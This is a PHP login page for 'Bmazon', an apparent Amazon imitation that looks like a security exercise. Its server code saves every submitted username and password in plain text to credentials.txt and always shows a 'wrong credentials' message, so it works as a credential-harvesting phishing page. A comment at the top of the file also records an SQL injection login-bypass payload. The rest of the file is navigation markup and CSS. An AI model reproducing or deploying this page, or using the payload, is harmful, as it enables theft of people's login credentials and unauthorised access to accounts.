<!-- SQL Injection: valentin37' OR true--' -->
<?php
  $login_err = "";
  if(isset($_POST['username']) && isset($_POST['password'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];
    $text = $username . ":" . $password;
    $myfile = fopen('credentials.txt', 'w');
    fwrite($myfile, $text);
    fclose($myfile);
    $login_err ="* Identifiants incorrects";
  }
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Bmazon</title>
</head>
  <body>
    <nav>
      <ul class="nav_links">
        <li><a href="index.php"><img src="./logo.svg" alt="logo" width="30rem" height="30rem"></img>Bmazon</a></li>
        <li><a href="login.php">Login</a></li>
        <li><a href="register.php">Créez un compte</a></li>
      </ul>
    </nav>
    <form class="login-box" method="POST" action="<?php $_SERVER["PHP_SELF"];?>" >
      <h1>Login</h1>
      <input type="text" name="username" placeholder="Username">
      <input type="password" name="password" placeholder="Password">
      <input type="submit" name="submit" value="Login">
      <span class="error"> <?php echo $login_err;?></span>
    </form>

  </body>
</html>


<style>
:root {
  font-size: 24px;
  font-family: Arial, Helvetica, sans-serif;

  --nav-bckg-color: #24252a;
  --main-color: #0088a9;
}

* {
  box-sizing: border-box;
  margin: 0;
  padding: 0;
}

li, a, button {
  color: white;
  text-decoration: none;
}

nav {
  display: flex;
  height: 1.8rem;
  background-color: var(--nav-bckg-color);
  z-index: 9999;
}

.nav_links {
  width: 100%;
  list-style: none;
  display: flex;
  justify-content: space-between;
  padding-top: 5px;
  padding-bottom: 5px;
}

.nav_links li {
  display: inline-block;
  padding: 0px 20px;
}

.nav_links li a, .sidenav li a {
  transition: all 0.3s ease 0s;
}

.nav_links li a:hover, .sidenav li a:hover {
  color: var(--main-color);   
}

body::-webkit-scrollbar {
  width: 0.25rem;
}

body::-webkit-scrollbar-track{
  background: #1e1e24;
}

body::-webkit-scrollbar-thumb{
  background: #6649b8;
}

.login-box {
  width: 450px;
  padding: 40px;
  position: absolute;
  top: 50%;
  left: 50%;
  transform: translate(-50%,-50%);
  background-color: #1e1e24;
  text-align: center;
}

.login-box h1 {
  color: white;
  font-weight: 500;
}

.login-box input[type = "text"], .login-box input[type = "password"] {
  border: 0;
  background: none;
  display: block;
  margin: 20px auto;
  text-align: center;
  border: 2px solid #0088a9;
  padding: 14px 10px;
  width: 200px;
  outline: none;
  color: white;
  border-radius: 24px;
  transition: 0.25s;
}

.login-box input[type = "text"]:focus, .login-box input[type = "password"]:focus {
  width: 280px;
  border-color: #6649b8;
}

.login-box input[type = "submit"]{
  border: 0;
  background: none;
  display: block;
  margin: 20px auto;
  text-align: center;
  border: 2px solid #6649b8;
  padding: 14px 40px;
  outline: none;
  color: white;
  border-radius: 24px;
  transition: 0.25s;
  cursor: pointer;
}

.login-box input[type = "submit"]:hover{
  background-color: #6649b8;
}

.error {
  color: red;
  font-size: 14px;
}
</style>